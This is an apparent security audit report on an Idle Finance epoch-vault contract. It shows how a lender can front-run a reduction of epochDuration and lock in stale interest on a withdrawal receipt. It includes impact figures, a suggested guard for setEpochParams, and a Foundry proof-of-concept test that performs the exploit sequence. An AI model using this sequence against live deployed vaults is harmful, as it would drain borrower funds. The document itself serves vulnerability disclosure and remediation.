### Title
Withdrawal receipts retain stale interest after `epochDuration` is shortened - ([File: contracts/IdleCDOEpochVariant.sol](contracts/IdleCDOEpochVariant.sol))

### Summary
A lender can front-run a legitimate epoch-duration reduction with `requestWithdraw` and permanently lock in interest calculated using the previous, longer duration. The receipt is minted as a fixed claim and added to `pendingWithdraws`, while `setEpochParams` neither reprices nor rejects pending receipts. The borrower must then fund the stale receipt after an epoch that accrued interest for only the shorter duration.

### Finding Description
`requestWithdraw` prices projected interest through `_calcInterestWithdrawRequest`, which uses the currently configured `epochDuration`. [1](#0-0) [2](#0-1) 

The resulting payout is fixed when `IdleCreditVault.requestWithdraw` mints the receipt and adds it to `pendingWithdraws`. [3](#0-2) 

While no epoch is running, `setEpochParams` permits `epochDuration` to be replaced and has no `pendingWithdraws == 0` guard or receipt repricing logic. [4](#0-3) 

The next epoch’s actual duration is established only when `startEpoch` sets `epochEndDate = block.timestamp + epochDuration`. [5](#0-4) 

At the subsequent `stopEpoch`, the protocol pulls the unchanged `pendingWithdraws` amount from the borrower and sends it to `IdleCreditVault` for receipt claims. [6](#0-5) [7](#0-6) 

### Impact Explanation
An attacker can receive interest priced for the old duration while waiting only for the shortened epoch plus buffer. For example, with a 365-day epoch, zero buffer, 10% APR, and a tranche receiving the full interest split, a 1,000,000-underlying request creates approximately 100,000 underlying of projected interest. If the duration is subsequently reduced to one day, the duration-consistent interest is only about 274 underlying, leaving approximately 99,726 underlying of excess borrower-funded payout before fees.

This breaks the fair payout invariant: the fixed receipt is paid according to stale duration parameters rather than the duration of the epoch that actually funds it. A sufficiently large receipt can consume borrower returns that would otherwise support active lenders, or trigger default/insolvency if the borrower cannot fund the inflated claim.

### Likelihood Explanation
Exploitation requires an epoch-duration reduction to occur after the request and before `startEpoch`. Manager and owner are honest, but the attacker can monitor governance announcements, public mempool transactions, or routine configuration changes and submit `requestWithdraw` first. No attacker privileges are required beyond passing wallet eligibility and owning tranche tokens.

The attack is most profitable when the duration reduction is large and the projected net interest remains positive after management and performance fees. Existing epoch-state and KYC checks do not prevent the sequence because both `requestWithdraw` and `setEpochParams` are individually allowed while the epoch is not running.

### Recommendation
Prevent duration changes while withdrawal receipts remain outstanding, or reprice all pending receipts atomically when `epochDuration`, `bufferPeriod`, or APR changes. A conservative fix is:

```solidity
// contracts/IdleCDOEpochVariant.sol
function setEpochParams(uint256 _epochDuration, uint256 _bufferPeriod) public {
    _checkOnlyOwnerOrManager();
    _checkNotAllowed(
        defaulted ||
        isEpochRunning ||
        _epochDuration == 0 ||
        epochDuration == 0 ||
        IdleCreditVault(strategy).pendingWithdraws() != 0 ||
        IdleCreditVault(strategy).pendingInstantWithdraws() != 0
    );
    epochDuration = _epochDuration;
    bufferPeriod = _bufferPeriod;
}
```

If changing parameters with pending receipts must remain supported, store the funding duration and APR basis on each receipt epoch and ensure `stopEpoch` explicitly honors or settles that accounting assumption.

### Proof of Concept
The following Foundry test is intended for the existing setup in `test/foundry/IdleCreditVault.t.sol`:

```solidity
function testWithdrawRequestKeepsInterestForStaleEpochDuration() external {
    address attacker = address(this);
    uint256 amount = 1_000_000 * ONE_SCALE;
    uint256 longDuration = 365 days;
    uint256 shortDuration = 1 days;

    // Configure a long epoch with no buffer and a 10% APR.
    vm.startPrank(manager);
    cdoEpoch.setEpochParams(longDuration, 0);
    IdleCreditVault(address(strategy)).setAprs(10e18, 10e18);
    vm.stopPrank();

    deal(defaultUnderlying, attacker, amount);
    IERC20Detailed(defaultUnderlying).approve(address(cdoEpoch), amount);

    // Deposit and queue a withdrawal while the long duration is active.
    uint256 trancheAmount = cdoEpoch.depositAA(amount);
    uint256 quotedReceipt = cdoEpoch.requestWithdraw(
        trancheAmount,
        address(AAtranche)
    );

    // Honest manager later shortens the epoch before starting it.
    vm.startPrank(manager);
    cdoEpoch.setEpochParams(shortDuration, 0);
    cdoEpoch.startEpoch();
    vm.stopPrank();

    uint256 actualEnd = cdoEpoch.epochEndDate();
    assertEq(actualEnd - block.timestamp, shortDuration);

    // The borrower still has to fund the stale fixed receipt plus active interest.
    uint256 borrowerPayment =
        quotedReceipt + cdoEpoch.expectedEpochInterest();
    deal(defaultUnderlying, borrower, borrowerPayment);
    vm.prank(borrower);
    IERC20Detailed(defaultUnderlying).approve(
        address(cdoEpoch),
        borrowerPayment
    );

    vm.warp(actualEnd + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(initialProvidedApr, 0);

    uint256 attackerBalanceBefore =
        IERC20Detailed(defaultUnderlying).balanceOf(attacker);
    cdoEpoch.claimWithdrawRequest();
    uint256 attackerReceived =
        IERC20Detailed(defaultUnderlying).balanceOf(attacker) -
        attackerBalanceBefore;

    uint256 durationConsistentGrossInterest =
        amount *
        (10e18 / 100) *
        shortDuration /
        (365 days * ONE_TRANCHE_TOKEN);

    assertEq(attackerReceived, quotedReceipt);
    assertGt(
        attackerReceived,
        amount + durationConsistentGrossInterest
    );
}
```

  function _calcInterestWithdrawRequest(uint256 _amount, address _tranche) internal view returns (uint256 _interest, int256 _diff) {
    uint256 _duration = epochDuration;
    if (_duration == 0) {
      return (_interest, _diff);
    }

    uint256 _buffer = bufferPeriod;
    // calculate total vault interest (they don't get the interest for the buffer period for withdraw requests so 
    // we scale it back since _calcInterest is scaling the interest with tht buffer period),
    uint256 totInterest = _calcInterest(_managedContractValue()) * _duration / (_duration + _buffer);
    // calculate total tranche interest for the whole tranche supply
    uint256 totTrancheInterest = _calcTrancheInterestShare(totInterest, _tranche);
    // calculate interest for the given tranche and given amount
    uint256 _trancheBal = _lastSavedNAV(_tranche);
    _interest = _trancheBal == 0 ? 0 : _amount * totTrancheInterest / _trancheBal;
    // calculate the interest that the _amount would have received if there was no split ratio (ie interest split based only on tvl).
    // This is used to calculate the interest that should be added to the expectedEpochInterest when 
    // withdrawing an AA tranche or the interest that should be removed from expectedEpochInterest when
    // withdrawing a BB tranche
    uint256 interestWithoutSplitRatio = _calcInterest(_amount) * _duration / (_duration + _buffer);
    // difference between total interest and tranche interest (positive for AA, negative for BB)
    _diff = int256(interestWithoutSplitRatio) - int256(_interest);

  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
    }
    if (_amount != 0) {
      underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
    }
  }
